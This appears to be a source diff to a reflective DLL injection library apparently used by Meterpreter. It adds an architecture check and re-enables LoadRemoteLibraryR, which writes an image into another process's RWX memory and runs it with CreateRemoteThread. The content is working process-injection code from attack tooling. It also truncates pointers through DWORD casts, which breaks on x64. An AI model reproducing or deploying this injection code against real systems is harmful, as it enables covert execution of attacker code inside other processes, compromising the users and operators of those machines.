@@ -57,11 +57,33 @@ DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
 	UINT_PTR uiAddressArray  = 0;
 	UINT_PTR uiNameOrdinals  = 0;
 	DWORD dwCounter          = 0;
+#ifdef _WIN64
+	DWORD dwMeterpreterArch = 2;
+#else
+	DWORD dwMeterpreterArch = 1;
+#endif
 
 	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;
 
 	// get the File Offset of the modules NT Header
 	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
+
+	// currenlty we can only process a PE file which is the same type as the one this fuction has  
+	// been compiled as, due to various offset in the PE structures being defined at compile time.
+	if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B ) // PE32
+	{
+		if( dwMeterpreterArch != 1 )
+			return 0;
+	}
+	else if( ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B ) // PE64
+	{
+		if( dwMeterpreterArch != 2 )
+			return 0;
+	}
+	else
+	{
+		return 0;
+	}
 
 	// uiNameArray = the address of the modules export directory entry
 	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
@@ -154,50 +176,56 @@ HMODULE WINAPI LoadLibraryR( LPVOID lpBuffer, DWORD dwLength )
 	return hResult;
 }
 //===============================================================================================//
-// Loads a DLL image from memory into the address space of a host process via the dll's exported ReflectiveLoader function
-/*
-BOOL WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength )
+// Loads a PE image from memory into the address space of a host process via the image's exported ReflectiveLoader function
+// Note: You must compile whatever you are injecting with REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR 
+//       defined in order to use the correct RDI prototypes.
+// Note: The hProcess handle must have these access rights: PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+//       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+// Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
+// Note: This function currently cant inject accross architectures, but only to architectures which are the 
+//       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
+HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter )
 {
-	BOOL bResult                              = FALSE;
-	DWORD dwReflectiveLoaderOffset            = 0;
+	BOOL bSuccess                             = FALSE;
 	LPVOID lpRemoteLibraryBuffer              = NULL;
 	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
-
-	if( hProcess == NULL || lpBuffer == NULL || dwLength == 0 )
-		return FALSE;
+	HANDLE hThread                            = NULL;
+	DWORD dwReflectiveLoaderOffset            = 0;
 
 	__try
 	{
-		// check if the library has a ReflectiveLoader...
-		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
-		if( dwReflectiveLoaderOffset != 0 )
+		do
 		{
-			// alloc memory (RWX) in the host process for the dll...
-			lpRemoteLibraryBuffer = (LPVOID)VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
-			if( lpRemoteLibraryBuffer == NULL )
-				return FALSE; 
+			if( !hProcess  || !lpBuffer || !dwLength )
+				break;
 
-			// write the dll's image into the host process...
-			if( WriteProcessMemory( hProcess, (LPVOID)lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) == 0 )
-				return FALSE; 
+			// check if the library has a ReflectiveLoader...
+			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer );
+			if( !dwReflectiveLoaderOffset != 0 )
+				break;
+
+			// alloc memory (RWX) in the host process for the image...
+			lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
+			if( !lpRemoteLibraryBuffer )
+				break; 
+
+			// write the image into the host process...
+			if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )
+				break;
 
 			// add the offset to ReflectiveLoader() to the remote library address...
-			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((DWORD)lpRemoteLibraryBuffer + (DWORD)dwReflectiveLoaderOffset);
+			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (DWORD)lpRemoteLibraryBuffer + (DWORD)dwReflectiveLoaderOffset );
 
 			// create a remote thread in the host process to call the ReflectiveLoader!
-			// TO-DO: fix the difference between the funk defs of ReflectiveLoader(VOID) and ThreadRoutine(LPVOID lpParam)
-			if( CreateRemoteThread( hProcess, NULL, (SIZE_T)NULL, lpReflectiveLoader, NULL, (DWORD)NULL, NULL ) == NULL )
-				return FALSE;
-
-			bResult = TRUE;
+			hThread = CreateRemoteThread( hProcess, NULL, (SIZE_T)NULL, lpReflectiveLoader, lpParameter, (DWORD)NULL, NULL );
 		}
+		while(  0 );
 	}
 	__except( EXCEPTION_EXECUTE_HANDLER )
 	{
-		bResult = FALSE;
+		hThread = NULL;
 	}
- 
-	return bResult;
+
+	return hThread;
 }
-*/
 //===============================================================================================//
